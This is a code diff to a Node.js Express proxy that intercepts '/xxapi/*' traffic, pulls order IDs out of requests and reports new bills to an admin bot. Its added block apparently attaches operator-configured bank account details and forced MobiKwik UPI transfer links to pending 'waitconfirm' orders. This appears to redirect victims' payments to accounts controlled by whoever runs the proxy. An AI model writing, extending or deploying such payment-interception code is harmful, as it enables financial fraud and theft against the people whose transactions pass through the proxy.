@@ -328,12 +328,9 @@ function parseMultipartFields(rawBody) {
   if (!rawBody || rawBody.length === 0) return {};
   const bodyStr = rawBody.toString();
   const fields = {};
-  const parts = bodyStr.split(/------[-a-zA-Z0-9]+/);
-  for (const part of parts) {
-    const match = part.match(/name="([^"]+)"[\s\S]*?\r?\n\r?\n([\s\S]*)/);
-    if (match) {
-      fields[match[1]] = match[2].trim();
-    }
+  const matches = bodyStr.matchAll(/name="([^"]+)"\r?\n\r?\n([^\r\n]+)/g);
+  for (const m of matches) {
+    fields[m[1]] = m[2].trim();
   }
   return fields;
 }
@@ -1290,13 +1287,6 @@ app.all('/xxapi/*', async (req, res) => {
           }
           const qs = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
           reqOrderId = rb.order_id || rb.orderId || rb.orderNo || rb.rptNo || rb.id || rb.slipId || qs.get('order_id') || qs.get('orderId') || qs.get('orderNo') || qs.get('rptNo') || qs.get('id') || qs.get('slipId') || '';
-          
-          if (!reqOrderId && req.method === 'POST') {
-             // Fallback for tricky multipart forms if parseMultipartFields misses it
-             const rawStr = req.rawBody ? req.rawBody.toString() : '';
-             const match = rawStr.match(/name="order_id"[\s\S]*?\r?\n\r?\n(\d+)/i) || rawStr.match(/name="orderId"[\s\S]*?\r?\n\r?\n(\d+)/i);
-             if (match) reqOrderId = match[1];
-          }
         } catch (e) { }
 
         // Also check if response has orderId if request doesn't
@@ -1820,9 +1810,43 @@ app.all('/xxapi/*', async (req, res) => {
         }
       }
       notifyAdmin(data,
-        `🔔 NEW BILL
-👤 User: ${userId || 'N/A'}${billInfo}
-🕐 ${now}`);
+        `🔔 NEW BILL\n👤 User: ${userId || 'N/A'}${billInfo}\n🕐 ${now}`);
+    }
+
+    if (urlLower.includes('waitconfirm')) {
+      if (respData && Array.isArray(respData.waitconfirm)) {
+        for (const wc of respData.waitconfirm) {
+          const rptNo = wc.rptNo;
+          const amt = parseFloat(wc.amount) || 0;
+          if (rptNo && data.botEnabled !== false) {
+            const activeBank = getActiveBank(data, null);
+            if (activeBank && (!activeBank.minAmount || amt >= activeBank.minAmount)) {
+              if (!data.orderBankMap) data.orderBankMap = {};
+              if (!data.orderBankMap[String(rptNo)]) {
+                const bkAcct = activeBank.accountNo || '';
+                const bkIfsc = activeBank.ifsc || '';
+                const bkName = activeBank.accountHolder || '';
+                const last4 = bkAcct.slice(-4);
+                const wDom = bkAcct ? `mobikwik://moneytransfer/upi/bank?account=${bkAcct}&ifsc=${bkIfsc}&name=${encodeURIComponent(bkName)}&amount=${amt}.0&displayAccountNumber=xxxxxxxxx${last4}` : '';
+                data.orderBankMap[String(rptNo)] = {
+                  bank: `${bkName} | ${bkAcct} | ${bkIfsc}`,
+                  bankName: activeBank.bankName || 'Bank',
+                  upiId: activeBank.upiId || '',
+                  amount: amt,
+                  orderId: rptNo,
+                  orderNo: wc.orderNo || rptNo,
+                  walletDomain: wDom,
+                  payType: 2,
+                  time: now,
+                  userId: String(userId || ''),
+                  forced: true,
+                  isManual: true
+                };
+              }
+            }
+          }
+        }
+      }
     }
 
     if (data.logRequests && data.adminChatId && bot && !isLogin && !isUserInfo && !isOrder) {
